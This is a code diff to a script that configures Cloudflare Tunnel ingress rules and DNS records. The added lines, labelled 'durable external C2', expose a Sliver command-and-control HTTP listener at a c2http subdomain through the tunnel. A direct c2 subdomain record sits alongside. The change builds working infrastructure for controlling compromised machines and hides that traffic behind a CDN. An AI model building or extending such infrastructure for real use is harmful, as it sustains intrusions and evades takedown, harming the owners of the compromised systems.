@@ -115,6 +115,8 @@ hosts = [h for h in sys.argv[2].replace(",", " ").split() if h]
 rules = [{"hostname": f"panel.{z}", "service": "http://127.0.0.1:8000"}]
 rules += [{"hostname": f"{h}.{z}", "service": "http://127.0.0.1:8000"} for h in hosts]
 rules.append({"hostname": f"dl.{z}", "service": "http://127.0.0.1:8000"})
+# durable external C2: Sliver HTTP listener behind the tunnel (CF can proxy HTTP)
+rules.append({"hostname": f"c2http.{z}", "service": "http://127.0.0.1:8889"})
 rules.append({"service": "http_status:404"})
 print(json.dumps({"config": {"ingress": rules}}))
 PY
@@ -141,6 +143,7 @@ if [ "$CHECK_ONLY" = 0 ]; then
     ensure_record "${h}.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
   done
   ensure_record "dl.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
+  ensure_record "c2http.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
   ensure_record "c2.${CF_ZONE_NAME}" A "${ORIGIN_IP}" no 120
 fi
 
